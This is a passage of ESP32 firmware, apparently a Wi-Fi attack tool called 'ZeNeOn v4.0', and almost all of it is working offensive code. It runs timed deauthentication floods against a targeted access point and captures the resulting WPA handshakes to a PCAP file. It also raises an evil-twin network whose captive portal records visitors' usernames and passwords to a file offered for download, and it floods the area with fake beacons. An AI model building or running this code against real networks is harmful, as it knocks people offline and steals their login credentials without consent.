  int total = sizeof(names) / sizeof(names[0]);
  for (int i = 0; i < spamCount && i < total; i++) {
    sendBeacon(names[i], strlen(names[i]), random(1, 12));
  }
}

/* ============ RESTORE AP ============ */
void restoreMainAP() {
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("ZeNeOn", "pakaya@12");
  WiFi.softAPmacAddress(ownAPMAC);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  evilTwinActive = false;
  Serial.println("Main AP restored: ZeNeOn");
}

/* ============ ROUTES ============ */
void setupRoutes() {
  server.on("/", []() { server.send(200, "text/html", homeUI()); });
  server.on("/deauth", []() { server.send(200, "text/html", deauthUI()); });
  server.on("/evilui", []() { server.send(200, "text/html", evilUI()); });
  server.on("/spamui", []() { server.send(200, "text/html", spamUI()); });

  server.on("/target", []() {
    targetSSID = server.arg("ssid");
    targetChannel = server.arg("ch").toInt();
    parseMac(server.arg("bssid"), targetBSSID);
    clientCount = 0;
    memset(clientMACs, 0, sizeof(clientMACs));
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                         WIFI_PROMIS_FILTER_MASK_DATA |
                         WIFI_PROMIS_FILTER_MASK_CTRL;
    esp_wifi_set_promiscuous_filter(&filter);
    deauthSeq = 0;
    deauthPktsSent = 0;
    Serial.printf("Target: %s CH:%d\n", targetSSID.c_str(), targetChannel);
    server.send(200, "text/plain", "Target locked: " + targetSSID);
  });

  server.on("/clients",
            []() { server.send(200, "text/plain", String(clientCount)); });
  server.on("/deauthstats",
            []() { server.send(200, "text/plain", String(deauthPktsSent)); });

  server.on("/attack", []() {
    if (targetBSSID[0] == 0 && targetBSSID[1] == 0 && targetBSSID[2] == 0 &&
        targetBSSID[3] == 0) {
      server.send(400, "text/plain", "No target selected");
      return;
    }
    if (memcmp(targetBSSID, ownAPMAC, 6) == 0) {
      server.send(400, "text/plain", "Cannot attack own AP!");
      return;
    }
    int t = server.arg("time").toInt();
    if (t < 1)
      t = 10;
    if (t > 120)
      t = 120;

    // Disable promiscuous before reconfiguring
    esp_wifi_set_promiscuous(false);
    delay(100);

    // Stay in AP_STA mode so ZeNeOn AP stays alive during attack
    // wsl_bypasser.c handles frame injection - no need for STA-only mode
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_max_tx_power(84);

    // Set country code for full power and channel access
    wifi_country_t country = {.cc = "US",
                              .schan = 1,
                              .nchan = 11,
                              .policy = WIFI_COUNTRY_POLICY_AUTO};
    esp_wifi_set_country(&country);

    // Lock target channel
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    delay(100);

    // Enable promiscuous mode for raw frame injection + client discovery
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                         WIFI_PROMIS_FILTER_MASK_DATA |
                         WIFI_PROMIS_FILTER_MASK_CTRL;
    esp_wifi_set_promiscuous_filter(&filter);

    deauthing = true;
    deauthPktsSent = 0;
    deauthStartTime = millis();
    deauthEndTime = deauthStartTime + ((unsigned long)t * 1000UL);
    lastDeauth = 0;

    // Auto-start PCAP capture during deauth attack
    if (!sniffing) {
      if (pcapFile) {
        pcapFile.flush();
        pcapFile.close();
      }
      if (SPIFFS.exists("/cap.pcap"))
        SPIFFS.remove("/cap.pcap");
      pcapFile = SPIFFS.open("/cap.pcap", FILE_WRITE);
      if (pcapFile) {
        pcap_hdr_t globalHeader;
        pcapFile.write((uint8_t *)&globalHeader, sizeof(globalHeader));
        pcapFile.flush();
        totalPacketsCaptured = 0;
        eapolFramesDetected = 0;
        sniffing = true;
        capturingHandshake = true;
        Serial.println("[+] Auto-started PCAP capture for deauth attack");
      }
    }

    // Debug output to verify target
    Serial.println("\n=================================");
    Serial.println("DEAUTHENTICATION ATTACK STARTED");
    Serial.println("=================================");
    Serial.printf("[TARGET] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  targetBSSID[0], targetBSSID[1], targetBSSID[2],
                  targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    Serial.printf("[TARGET] SSID: %s\n", targetSSID.c_str());
    Serial.printf("[TARGET] Channel: %d\n", targetChannel);
    Serial.printf("[TARGET] Duration: %ds\n", t);
    Serial.printf("[TARGET] Known clients: %d\n", clientCount);
    Serial.println("[MODE] AP_STA - ZeNeOn stays online during attack");
    Serial.println("=================================");

    server.send(200, "text/plain",
                "Attack started for " + String(t) +
                    "s (UI will reconnect after)");
  });

  server.on("/sniff", []() {
    if (sniffing) {
      server.send(200, "text/plain", "Already sniffing");
      return;
    }
    if (pcapFile) {
      pcapFile.flush();
      pcapFile.close();
    }
    if (SPIFFS.exists("/cap.pcap"))
      SPIFFS.remove("/cap.pcap");
    pcapFile = SPIFFS.open("/cap.pcap", FILE_WRITE);
    if (!pcapFile) {
      server.send(500, "text/plain", "Failed to create capture file");
      return;
    }
    pcap_hdr_t globalHeader;
    pcapFile.write((uint8_t *)&globalHeader, sizeof(globalHeader));
    pcapFile.flush();
    totalPacketsCaptured = 0;
    eapolFramesDetected = 0;
    if (targetChannel > 0 && targetChannel <= 13)
      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                         WIFI_PROMIS_FILTER_MASK_DATA |
                         WIFI_PROMIS_FILTER_MASK_CTRL;
    esp_wifi_set_promiscuous_filter(&filter);
    sniffing = true;
    capturingHandshake = true;
    Serial.println("[*] Packet capture started");
    server.send(200, "text/plain", "Capture started");
  });

  server.on("/download", []() {
    if (sniffing) {
      sniffing = false;
      capturingHandshake = false;
      if (pcapFile) {
        pcapFile.flush();
        pcapFile.close();
      }
      delay(100);
    }
    if (!SPIFFS.exists("/cap.pcap")) {
      server.send(404, "text/plain", "No capture file");
      return;
    }
    File f = SPIFFS.open("/cap.pcap", FILE_READ);
    if (!f) {
      server.send(500, "text/plain", "Failed to open file");
      return;
    }
    String filename = "capture_" + String(millis() / 1000) + ".pcap";
    server.sendHeader("Content-Disposition",
                      "attachment; filename=" + filename);
    server.sendHeader("Content-Type", "application/vnd.tcpdump.pcap");
    server.sendHeader("Content-Length", String(f.size()));
    server.streamFile(f, "application/vnd.tcpdump.pcap");
    f.close();
    Serial.printf("[*] PCAP downloaded: %s\n", filename.c_str());
  });

  server.on("/evil", []() {
    String ssid = server.arg("ssid");
    if (ssid.length() == 0) {
      server.send(400, "text/plain", "No SSID");
      return;
    }
    evilTwinSSID = ssid;
    credentialsCount = 0;
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.softAP(ssid.c_str());
    WiFi.softAPmacAddress(ownAPMAC);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    evilTwinActive = true;
    Serial.println("[!] Evil Twin: " + ssid);
    server.send(200, "text/plain", "Evil Twin started: " + ssid);
  });

  server.on("/submit", HTTP_POST, []() {
    String username = server.arg("username");
    String password = server.arg("password");
    if (username.length() > 0 && password.length() > 0) {
      credentialsCount++;
      Serial.println("\n=== CREDS CAPTURED ===");
      Serial.println("User: " + username);
      Serial.println("Pass: " + password);
      Serial.println("======================\n");
      File f = SPIFFS.open("/creds.txt", FILE_APPEND);
      if (f) {
        f.println("SSID: " + evilTwinSSID);
        f.println("User: " + username);
        f.println("Pass: " + password);
        f.println("---");
        f.close();
      }
    }
    server.send(200, "text/plain", "OK");
  });

  server.on("/getcreds", []() {
    if (!SPIFFS.exists("/creds.txt")) {
      server.send(404, "text/plain", "No credentials yet");
      return;
    }
    File f = SPIFFS.open("/creds.txt", FILE_READ);
    if (!f) {
      server.send(500, "text/plain", "Failed to open");
      return;
    }
    server.sendHeader("Content-Disposition",
                      "attachment; filename=credentials.txt");
    server.streamFile(f, "text/plain");
    f.close();
  });

  server.on("/stopevil", []() {
    if (evilTwinActive) {
      restoreMainAP();
      evilTwinSSID = "";
      server.send(200, "text/plain", "Evil Twin stopped.");
    } else
      server.send(200, "text/plain", "No evil twin active.");
  });

  server.on("/credstats",
            []() { server.send(200, "text/plain", String(credentialsCount)); });

  server.on("/spam", []() {
    int c = server.arg("count").toInt();
    if (c < 1)
      c = 10;
    if (c > 50)
      c = 50;
    spamCount = c;
    spamming = true;
    esp_wifi_set_promiscuous(true);
    Serial.println("[*] Spam started: " + String(c));
    server.send(200, "text/plain", "Spamming " + String(c) + " networks");
  });

  server.on("/stop", []() {
    bool wasActive = sniffing || deauthing || spamming || capturingHandshake;
    sniffing = false;
    deauthing = false;
    spamming = false;
    capturingHandshake = false;
    esp_wifi_set_promiscuous(false);
    delay(100);
    if (pcapFile) {
      pcapFile.flush();
      pcapFile.close();
    }
    if (evilTwinActive)
      restoreMainAP();
    else
      Serial.println("[*] Stopped. AP accessible.");
    if (wasActive)
      Serial.printf("[*] Pkts sent: %u | Captured: %u | EAPOL: %u\n",
                    deauthPktsSent, totalPacketsCaptured, eapolFramesDetected);
    server.send(200, "text/plain", "All operations stopped");
  });

  server.onNotFound([]() {
    if (evilTwinActive)
      server.send(200, "text/html", captivePortal());
    else
      server.send(200, "text/html", homeUI());
  });
}

/* ============ SETUP ============ */
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n====================================================");
  Serial.println("  ZeNeOn v4.0 made by MoOdY");
  Serial.println("====================================================\n");
  if (!SPIFFS.begin(true))
    Serial.println("[!] SPIFFS mount failed");
  else
    Serial.printf("[+] SPIFFS: %u/%u bytes used\n", SPIFFS.usedBytes(),
                  SPIFFS.totalBytes());
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("ZeNeOn", "pakaya@12");
  WiFi.softAPmacAddress(ownAPMAC);
  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("[+] AP: ZeNeOn | IP: %s\n", apIP.toString().c_str());
  dnsServer.start(DNS_PORT, "*", apIP);

  // FIX #6: Maximum power and country config at startup
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(84); // Max power

  // Set country code for full power output
  wifi_country_t country = {
      .cc = "US", .schan = 1, .nchan = 11, .policy = WIFI_COUNTRY_POLICY_AUTO};
  esp_wifi_set_country(&country);

  // Enable promiscuous mode for raw frame injection
  esp_wifi_set_promiscuous(true);
  setupRoutes();
  server.begin();
  Serial.printf("[+] Web UI: http://%s\n", apIP.toString().c_str());
  Serial.println("[+] SYSTEM READY\n");
  randomSeed(esp_random());
}

/* ============ LOOP ============ */
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (deauthing) {
    unsigned long now = millis();
    // FIX #5: Slower rate (10ms) to avoid ESP32 WiFi stack dropping packets
    if (now - lastDeauth >= 10) {
      Serial.printf("[DEAUTH] Sending burst to %d clients\n", clientCount);
      sendDeauthBurst();
      lastDeauth = now;
      static unsigned long lastLog = 0;
      if (now - lastLog >= 2000) {
        unsigned long rem =
            (deauthEndTime > now) ? (deauthEndTime - now) / 1000 : 0;
        Serial.printf("[>] Pkts: %u | Clients: %d | %lus left\n",
                      deauthPktsSent, clientCount, rem);
        lastLog = now;
      }
    }
    if (now >= deauthEndTime) {
      deauthing = false;
      esp_wifi_set_promiscuous(false);
      delay(100);

      // Save PCAP capture file before restoring AP
      if (sniffing && pcapFile) {
        pcapFile.flush();
        pcapFile.close();
        sniffing = false;
        capturingHandshake = false;
        Serial.printf("[+] PCAP saved: %u packets, %u EAPOL frames\n",
                      totalPacketsCaptured, eapolFramesDetected);
      }

      Serial.println("\n=================================");
      Serial.printf("[*] DEAUTH DONE: %u packets sent\n", deauthPktsSent);
      Serial.println("=================================");
      Serial.println("[*] Attack complete. ZeNeOn AP still online.");
    }
  }

  if (spamming) {
    if (millis() - lastSpam >= 100) {
      spamWiFi();
      lastSpam = millis();
    }
  }
}
